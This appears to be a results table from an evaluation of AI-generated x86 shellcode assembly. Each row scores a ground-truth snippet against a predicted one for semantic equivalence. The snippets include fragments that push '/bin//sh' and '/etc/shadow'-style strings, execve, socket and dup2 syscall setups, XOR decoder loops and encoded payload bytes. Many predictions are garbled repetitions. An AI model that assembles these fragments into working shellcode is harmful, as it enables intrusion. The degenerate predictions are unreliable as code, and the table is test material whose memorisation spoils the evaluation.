Ground Truth Snippets;Predicted Snippets;Score Semantic Equivalence
push dword ebx \\n push dword ebx;push dword 0x2 \\n push dword 0x2 \\n push dword 0x2 \\n push dword 0x2 \\n push dword 0x2 \\n push dword 0x2 \\n push dword 0x2 \\n push dword 0x2 \\n push dword 0x2 \\n push dword 0x2 \\n push dword 0x2 \\n push dword 0x2 \\n push dword 0x2 \\n push dword 0x2 \\n push dword 0x2 \\n push dword 0x2;GT: errorGenEXE
push 0x6d726574;push 0x6d726574;1
mov al, 0x3f;push sys \\n push for \\n push dup2 \\n mov al, 0x68732f2f \\n mov dup2, 0x6e69622f \\n mov for, 0x69622f \\n mov dup2, 0x69622f \\n mov dup2, 0x69622f \\n mov for, 0x69622f2f \\n mov dup2, 0x69622f \\n mov dup2, 0x69622f \\n mov for, 0x69622f;0
call decoder;jmp zero68732f \\n jmp zero68732f \\n jmp zero68732f \\n jmp zero68732f \\n jmp zero6e69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f;GT: errorGenEXE
test al, al \\n jz found \\n inc ecx;cmp al, ecx \\n jz found \\n inc ecx;0
mov bl, 5;mov bl, 5;1
int 0x80;int 0x80;1
marks dw 0, 0, 0, 0;for: dd 0x68732f \\n dd 0x68732f \\n dd 0x6e69622f \\n dd 0x69622f \\n dd 0x69622f \\n dd 0x69622f \\n dd 0x69622f \\n dd 0x69622f \\n dd 0x69622f \\n dd 0x69622f \\n dd 0x69622f \\n dd 0x69622f \\n dd 0x69622f \\n dd 0x6;GT: errorGenEXE
push eax;push edx;GT: errorGenEXE
sub eax, 0x013ffeff \\n push eax;push ' in/c';GT: errorGenEXE
xor ebx, ebx \\n mov ebx, eax;xor ebx, ebx \\n mov eax, eax;GT: errorGenEXE
pop esi;pop esi;1
mov al, 102 \\n int 80h;push 0x68732f2f \\n push 0x6e69622f;GT: errorGenEXE
push ebx;push ebx;1
xchg ebx, ecx;xchg ecx, ebx;GT: errorGenEXE
mov ecx,eax \\n push ecx;mov ecx, eax \\n push ecx;1
add ax, bx;add ax, bx;1
decode:;decode:;1
push byte 0x77;push byte 0x77;1
lea ebx, [esp];mov ebx, esp;GT: errorGenEXE
push eax \\n push dword 0x64616568 \\n push dword 0x2f6e6962 \\n push dword 0x2f2f2f2f \\n push dword 0x7273752f;push 0-term \\n push daeh \\n push rsu/ on;0
push ebx;push 0x68732f \\n push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f;GT: errorGenEXE
xor eax, 0xffffffff;xor 0xffffffff, 0xffffffff \\n xor eax, eax;0
add al,0x3b;add al, 0x3b;1
mov [esi], al;mov esi, al;0
mov eax, 1;mov eax, 1;1
xor ebx, ebx \\n push ebx;push edx;GT: errorGenEXE
push eax \\n mov edx, esp \\n push ebx \\n mov ecx, esp \\n mov al, 0xb \\n int 0x80;int 0x80;GT: errorGenEXE
entrypoint:;entrypoint:;1
mov dl, 0x1c;mov dl, 0x1c;1
sub byte [ebp+ecx],20h;sub ecx, 20h;GT: errorGenEXE
push ecx;push ecx;1
mov ebx, esp;mov ebx, esp;1
mov edi, 0x3734b117;mov edi, 0x3734b117;1
xor byte [esi + ecx - 1], 0x3;xor byte [esi + ecx - 1], bh;GT: errorGenEXE
sub byte [esi], 13;sub byte [esi], 13;1
push eax;push eax(socket;0
mov edx, ecx;mov edx, esp;GT: errorGenEXE
mov [ebx+8], ebx;mov [ebx + 8], ebx;1
push 0x2 \\n pop ecx;push 0x2 \\n pop ecx;1
lea edx, [esi+0x10];lea edx, [esi+0x10];1
mov eax, 19;mov byte [esi], 0x68732f2f \\n mov byte [esi], 0x68732f \\n mov byte [esi], 0x6e69622f \\n mov byte [esi], 0x69622f \\n mov byte [esi], 0x69622f \\n mov byte [esi], 0x6e69622f \\n mov byte [esi], 0x69622f2f \\n mov byte [esi], 0x69622f;GT: errorGenEXE
arr1 resb 400;push byte 0x68732f2f \\n push byte 0x68732f \\n push byte 0x6e69622f \\n push byte 0x69622f \\n push byte 0x69622f \\n push byte 0x69622f \\n push byte 0x69622f \\n mov uninitialized, esp;0
xor cl, 0XAA \\n jz shift_decode;xor cl, 0xAA \\n jz shift_decode;GT: errorGenEXE
nop;xor eax, 0x68732f2f \\n xor eax, 0x68732f \\n xor eax, 0x6e69622f \\n xor eax, 0x69622f \\n xor eax, 0x69622f \\n xor eax, 0x69622f \\n xor eax, 0x69622f \\n xor eax, 0x69622f2f \\n xor eax, 0x69622f2f \\n xor eax, 0x69622f;GT: errorGenEXE
decoded_shellcode: \\n call [esp];decoded_shellcode: \\n call stack;GT: errorGenEXE
mov eax, 90;mov eax, 0x68732f2f \\n mov eax, 0x68732f \\n mov eax, 0x6e69622f \\n mov eax, 0x69622f \\n mov eax, 0x69622f \\n mov eax, 0x69622f \\n mov eax, 0x6e69622f \\n mov eax, 0x69622f \\n mov eax, 0x69622f2f \\n mov eax, 0x69622f;GT: errorGenEXE
cmp ax, bx \\n jne l3 \\n jmp while;cmp ax, bx \\n jne while;GT: errorGenEXE
format:;format:;1
mul ebx;mul ebx;1
lea edi, [esi];push 0x68732f2f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n mov edi, esp;GT: errorGenEXE
push edx;push edx;1
L4: \\n jmp short esp;L4: \\n jmp short stack;GT: errorGenEXE
push dword 0x8140a8c0;push dword 0x8140a8c0;1
mov esi, 10;mov esi, 10;1
jmp short setup;jmp short _setup;GT: errorGenEXE
push 0x6e69622f \\n push 0x7273752f \\n mov ebx, esp;push 0x6e69622f \\n push 0x7273752f \\n mov ebx, esp;1
hlt;xor until, until \\n sub until, 0x68732f2f \\n sub until, 0x6e69622f \\n xor until, 0x69622f \\n xor until, 0x69622f \\n xor until, 0x69622f \\n xor until, 0x69622f \\n xor until, 0x69622f \\n xor until, 0x69622f \\n xor until, 0x69622f \\n xor until, 0x;0
mov eax, edx;mov eax, edx;1
call _myfunc;call _myfunc;1
sub byte [esi], 0xd;sub byte [esi], 0xd;1
push edx;push edx;1
cmp ecx, 5;cmp ecx, 5;1
jns decode_pr;jns decode_pr;1
zero1e:;_zero1e:;GT: errorGenEXE
int 80h;call sys_read;GT: errorGenEXE
push ecx \\n push 0x68736162 \\n push 0x2f6e6962 \\n push 0x2f2f2f2f;push ecx \\n push cotent \\n push 'hsab' \\n push '/nib' \\n push '////';0
"call _appendfile \\n msg2 db ""passwd"", 0x00";inc _appendfile \\n inc _appendfile \\n inc _appendfile \\n inc _appendfile \\n inc _appendfile \\n inc _appendfile \\n inc _appendfile \\n inc _appendfile \\n inc _appendfile \\n inc _appendfile \\n inc _appendfile \\n inc _appendfile \\n inc _appendfile \\n inc istruction \\n inc istruction \\n inc istruction \\n inc istruction \\n inc pf;0
xor ecx, ecx \\n mul ecx;xor eax, eax \\n xor edx, edx;GT: errorGenEXE
D2: \\n not byte [esi];D2: \\n not byte [esi];1
mul ebx;xor eax, eax;GT: errorGenEXE
_write:;_write:;1
inc cl;inc cl \\n inc cl;GT: errorGenEXE
mov esi, 0x353ffc3b;mov esi, 0x353ffc3b;1
mov ecx, edx;mov ecx, edx;1
inc ebx;inc ebx;1
push 0x78;push 0x78;1
mov ecx,esp;mov ecx, esp;1
xor ah, ah;xor ah, ah;1
_load_data:;_load_data:;1
push ebx \\n push ebx \\n push esi;push ebx \\n push esi;GT: errorGenEXE
test eax, eax \\n jnz checkforfile;test eax, eax \\n jz checkforfile;GT: errorGenEXE
push edx;push edx;1
mov cl,0x2;mov cl, 2;GT: errorGenEXE
rol edx, 0x4;rol edx, 4;GT: errorGenEXE
mov edi, ecx;mov edi, ecx;1
mov edi, edx;mov edi, edi;GT: errorGenEXE
xor ebx,eax;xor ebx, ebx \\n xor eax, eax;GT: errorGenEXE
push byte 67 \\n pop eax;push byte 67 \\n pop eax;1
mov esi, eax;mov esi, eax;1
push ebx;push ebx;1
mov dl, 0x02;mov dl, 0x02;1
lea edi, [esi +1];mov edi, [esi];GT: errorGenEXE
sub ebx, 0x2e2aa163;sub ebx, 0x2e2aa163;1
xor bx, bx;xor bx, bx;1
F2: \\n call function_1;F2: \\n call function1;GT: errorGenEXE
xor ecx, ecx \\n mul ecx;xor ecx, ecx \\n mul ecx;1
cmp al, 0xf2 \\n jz next_page;test efault, efault \\n jmp next_page;0
int 0x80;init:;GT: errorGenEXE
div edx;div edx;1
mov eax, [x];mov eax, [x];1
cmp eax, ebx \\n je all;cmp eax, ebx \\n jne all;GT: errorGenEXE
my_table times 10 dw 0;push 0x68732f2f \\n push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n mov my_table, esp;0
push 0x706d742f;push 0x706d742f;1
mov ax, 1;mov ax, 1;1
mov al, 5;mov al, 5;1
scasd;cmp eax, dword [edi] \\n not dword [edi];GT: errorGenEXE
ret;pop that;0
mov al, dl;mov al, dl;1
sub [var2], esi;sub var2, esi;0
sub ecx, 23;sub ecx, 23;1
push edi \\n mov eax, esp;push edi \\n mov eax, esp;1
test eax, eax \\n jz write \\n xor eax, eax;test eax, eax \\n jz write;GT: errorGenEXE
lea ebx, [edx+0x4];mov ebx, edx+0x4;0
cmp [ebp+var_a], 0;cmp [ebp+var_a], 0;1
inc ebx \\n push ebx;push 1;GT: errorGenEXE
word1 word 65535;word1: db 65535;GT: errorGenEXE
sub cx, cx;sub cx, cx;1
mov ebx, 4;mov eax, 0x68732f2f \\n int 0x6e69622f \\n int 0x69622f \\n int 0x69622f \\n int 0x69622f \\n int 0x69622f \\n int 0x69622f \\n int 0x6e69622f \\n int 0x69622f \\n int 0x6e69622f \\n int 0x6e69622f \\n int 0x6e69622f \\n int 0x;GT: errorGenEXE
incpage:;incpage:;1
push word 0x632d \\n mov edi, esp;push word 0x632d \\n mov edi, esp;1
push ecx;push ecx;1
test eax, eax \\n js _while_loop;test eax, eax \\n jns _while_loop;GT: errorGenEXE
mov ecx,esp;mov ecx, esp;1
cmp dword ptr [eax],edx \\n jne loop;edx: \\n dword ptr 0x68732f2f \\n dword ptr 0x68732f \\n dword ptr 0x6e69622f \\n dword ptr 0x69622f \\n dword ptr 0x69622f \\n dword ptr 0x69622f \\n dword ptr 0x69622f \\n dword ptr 0x69622f \\n dword ptr 0x69622f \\n dword ptr 0x69622f \\n dword ptr 0x696;0
jne encodedshellcode;jz _encodedshellcode;GT: errorGenEXE
me:;me:;1
push ebx;push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f;GT: errorGenEXE
cld;xor ecx, ecx \\n mul ecx;GT: errorGenEXE
sub eax, ebx;sub eax, ebx;1
mov bl,0x3;push 0x3 \\n pop bl;0
cmp al, 0xf2 \\n jz _start;cmp al, 0xf2 \\n jge _start;GT: errorGenEXE
lea ecx, [esi + 8];lea ecx, [esi+8];1
xor ebx, ebx;xor ebx, ebx;1
mov ax, 1666;mov ax, 1666;1
mov ebx, esp;mov ebx, esp;1
push dword 0x61722f6c;push dword 0x61722f6c;1
cmp cl, 0x11 \\n jb 0xff \\n add dl, 0x5;cmp cl, 0x11 \\n jl 0xff \\n add dl, 0x5;GT: errorGenEXE
loop l4 \\n mov edx, esp;loop l4 \\n mov edx, esp;1
mov cl, 4;mov cl, 4;1
loop decode \\n jmp Shellcode;loop decode \\n jmp Shellcode;1
xchg eax, ebx;xchg eax, ebx;1
cmp byte [esi], 0xD \\n jl wrap_around;cmp byte [esi], 0xD \\n jl wrap_around;1
mov byte [esi + 1], dl;mov [esi+1], dl;GT: errorGenEXE
mov al, 0x3f;push 63 \\n pop 63;0
push 0xdebf;push 0xdebf;1
section .text;section;GT: errorGenEXE
mov al, 15;mov byte [eax], 15;GT: errorGenEXE
push eax;push edx;GT: errorGenEXE
push dword 0x2f2f2f2f \\n push dword 0x7273752f \\n mov ebx, esp;push dword 0x2f2f2f2f \\n push dword 0x7273752f \\n mov ebx, esp;1
lea ecx, [esp];mov ecx, esp;GT: errorGenEXE
push 0x69622f3a;push 0x69622f3a;1
push eax;push eax;1
mov eax, msg1;mov eax, msg1;1
lea ecx, [zero_reg+117];push 0x68732f2f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n mov ecx, esp;GT: errorGenEXE
mov dword [esp-0x24], 0x732f636f;mov dword [0x732f636f], 0x732f636f;GT: errorGenEXE
push 0x6873732f \\n push 0x6374652f \\n mov edx, esp;push 0x6873732f \\n push 0x6374652f \\n mov edx, esp;1
inc esi;inc esi;1
mov esi, eax;mov esi, eax;1
shr ax, cl;cmp ax, cl;0
cmp eax, ebx;cmp ebx, eax;GT: errorGenEXE
section .text \\n _start:;section .data, _start;GT: errorGenEXE
dec byte dl;dec dl;GT: errorGenEXE
jmp callpop;jmp zero68732f \\n jmp zero68732f \\n jmp zero68732f \\n jmp zero68732f \\n jmp zero6e69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f;GT: errorGenEXE
mov eax, 2;mov eax, 0x68732f2f \\n mov eax, 0x6e69622f;GT: errorGenEXE
sub esp, 0x7f;sub 0x7f, 0x7f;0
push 0x706d742f;push 0x706d742f;1
xor byte [esi], 0x97;xor byte [esi], 0x97;1
mov al, 0x5;mov al, 0x68732f2f \\n mov al, 0x6e69622f;GT: errorGenEXE
inc ebx;inc ebx;1
mul ebx;xor eax, eax;GT: errorGenEXE
mov ax, 0x16b;push 0x68732f2f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n mov ax, esp;0
xor eax,eax \\n xor ebx,ebx;xor eax, eax \\n xor ebx, ebx;1
push 0x706d742f;push 0x706d742f;1
push word 0x1b6 \\n pop ecx;mov ecx, read-write;0
loop fill;loop ecx \\n xor var1, var1 \\n xor unless, unless \\n xor decrementing, decrementing;0
push dword eax;push dword eax;1
shellcode:;shellcode:;1
neg eax;not eax;GT: errorGenEXE
mov dword [esp-12], 0x6374652f;mov dword [[], 0x6374652f;0
push 0x7461632f \\n push 0x6e69622f \\n mov edx, esp;push 0x7461632f \\n push 0x6e69622f \\n mov edx, esp;1
push 0x04020a0a;push 0x68732f \\n push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f;GT: errorGenEXE
mul [var];mul 32-bit;0
lea ebx, [ebp+39];push 0x68732f2f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n mov ebx, esp;GT: errorGenEXE
mov rcx, 0x68732f2f6e69622f;push 0x68732f2f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n mov rcx, esp;0
mov cx, 0x401;mov cx, 0x401;1
cmp bh, al;cmp bh, al;1
push 0x7665642f;push 0x7665642f;1
jmp short shellcode_section;jmp zero68732f \\n jmp zero68732f \\n jmp zero68732f \\n jmp zero68732f \\n jmp zero6e69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f;GT: errorGenEXE
ja write;jge write;GT: errorGenEXE
mov ecx, 4294948047;mov ecx, 4294948047;1
mov al, 0x2e;push setgid \\n pop = \\n pop 0x2e;0
mov ecx, esp;push trasnfer \\n pop ecx;GT: errorGenEXE
jmp short stage;jmp short stage;1
je short loc_402b13;cmp loc_402b13, loc_402b13 \\n je loc_402b13;0
pop ebx;push byte 0x68732f2f \\n push byte 0x6e69622f \\n push byte 0x69622f \\n push byte 0x69622f \\n push byte 0x69622f \\n mov ebx, esp;GT: errorGenEXE
mov ecx, esp;pop ecx;GT: errorGenEXE
mov eax, 0x50905090;push byte 0x50905090 \\n push 0x50905090 \\n push 0x50905090 \\n push 0x50905090 \\n push 0x50905090 \\n push 0x50905090 \\n push 0x50905090 \\n push 0x509050905090 \\n push 0x509050905090 \\n push 0x509050905090 \\n push 0x509050905090 \\n push 0x5090509050905090 \\n push 0x5090;GT: errorGenEXE
push byte 0x1 \\n pop edx;push byte 0x1 \\n pop edx;1
shellcode: db 0x4b,0xf7,0x13,0x59,0xcc,0x8c,0x63,0x5e,0x9f,0x8d,0x99,0x9f,0x1f,0xa4,0x3b,0x6e,0xc6,0x36,0x23;shellcode: db 0x4b,0xf7,0x13,0x59,0xcc,0x8c,0x63,0x5e,0x9f,0x8d,0x99,0x9f,0x1f,0xa4,0x3b,0x6e,0xc6,0x36,0x23;1
pop ecx;pop ecx;1
jmp nextchar;jmp code;GT: errorGenEXE
jz download;jz download;1
push 0x3 \\n pop ebx;push sys_connect \\n pop = \\n pop ebx;0
mov esi, esp;mov esi, esp;1
cmp eax,ebx \\n je exit;cmp eax, ebx \\n je _exit;GT: errorGenEXE
push dword eax;push dword eax;1
add byte [esi], 0x02;add byte [esi], 0x02;1
mov [ebp+20], zero_reg;mov zero_reg, [[];0
push edx \\n push esi \\n push edi \\n push ebx \\n mov ecx, esp;push edx \\n push esi \\n push edi \\n push ebx \\n mov ecx, esp;1
pop eax;pop eax;1
zero1b:;_zero1b:;GT: errorGenEXE
mov eax, 65;mov eax, 0x68732f2f \\n int 0x68732f \\n int 0x6e69622f \\n int 0x69622f \\n int 0x69622f \\n int 0x69622f;GT: errorGenEXE
jmp short formatting;jmp short formatting;1
xchg ebx,eax;xchg ebx, eax;1
jmp edi;jmp edi;1
xor edx, edx \\n mul edx;xor eax, eax \\n mul eax;GT: errorGenEXE
xor ax, 0x539;xor ax, 0x539;1
sub eax, 8;sub eax, 8;1
push 0x61622f6e;push 0x61622f6e;1
push dx;push dx;1
mov ecx,esp;mov ecx, esp;1
notdecode:;notdecode:;1
jmp read;jmp read;1
push word 0x776f;push word 0x776f;1
push 0x68732f2f \\n push 0x68732f2f \\n push 0x2f656c2d;push ' -le///sh//sh';GT: errorGenEXE
child:;child:;1
mov edx, response;mov edx, response;1
scasd \\n l1 IncAddr;cmp DWORD [eax], edi \\n jne l1;GT: errorGenEXE
mov esi, 0x353ffc3b;mov esi, 0x353ffc3b;1
_ip equ 0x0100007f;ip equ 0x0100007f;GT: errorGenEXE
lea edx, [ebx+12];lea edx, [ebx+12];1
pop esi;mov esi, word [esi];0
xor eax, eax \\n xor ebx, ebx \\n xor ecx, ecx \\n xor edx, edx;xor eax, eax \\n xor ebx, ebx \\n xor ecx, ecx \\n xor edx, edx;1
add edx, 32;add edx, 32;1
xor eax, eax \\n mov ebx, eax \\n mov ecx, eax \\n mov edx, eax;xor eax, eax \\n xor ebx, ebx \\n xor ecx, ecx \\n xor edx, edx;GT: errorGenEXE
mov byte [esi + 1], dl;mov dl, byte [esi+1];GT: errorGenEXE
push 0xb \\n pop eax;push __nr_execve \\n pop eax;GT: errorGenEXE
or eax, 0xffffffff \\n not eax \\n push eax;mov eax, value -1 \\n not eax;GT: errorGenEXE
mov bl, 3 \\n dec bl \\n jnz l3;mov bl, 3 \\n dec bl \\n jnz l3;1
call decoder \\n shellcode: db 0x62,0x60,0xa0,0x34,0x5e,0x97,0xe6,0x34,0xd0,0x97,0xc4,0xb4,0xdc,0xc4,0xc7,0x28,0x13,0x71,0xa6,0xc4,0xc3,0x58,0x16,0xe6,0x01;jmp shellcode;GT: errorGenEXE
mov al, 0x8;push byte 0x8 \\n pop 0x8;0
shr bl, 4;shr bl, 4;1
push 0x746f6f72;push 0x746f6f72;1
xor eax, eax \\n mov al, 6;xor eax, eax \\n mov numebr, esp;0
ja exi;jge exi;GT: errorGenEXE
mov ecx, 0x1;mov ecx, 0x1;1
mov eax, [ebx+esi*2+4];mov eax, [ebx+esi*2+4];1
_start: \\n jmp short call_shellcode;_start: \\n jmp short call_shellcode;1
mov edx, dword 0x65676760;mov edx, 0x65676760;GT: errorGenEXE
xor ecx, ecx;xor ecx, ecx;1
sub eax, 3;dec eax;GT: errorGenEXE
_file:;_file_label:;GT: errorGenEXE
int 0x80;int 80h;GT: errorGenEXE
push dword 0x3a303a3a;push dword 0x3a303a3a;1
cmp BYTE al, 2 \\n je do_inject;cmp al, 2 \\n jne do_inject;GT: errorGenEXE
movq mm3, qword [esi];mov mm3, \shellcode\;0
je exit;jne exit;GT: errorGenEXE
mov byte [edi], bl;mov byte [edi], bl;1
xchg edi,eax;xchg edi, eax;1
push eax \\n mov edx,esp;"push edx \\n push 0x68732f \\n push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x
";GT: errorGenEXE
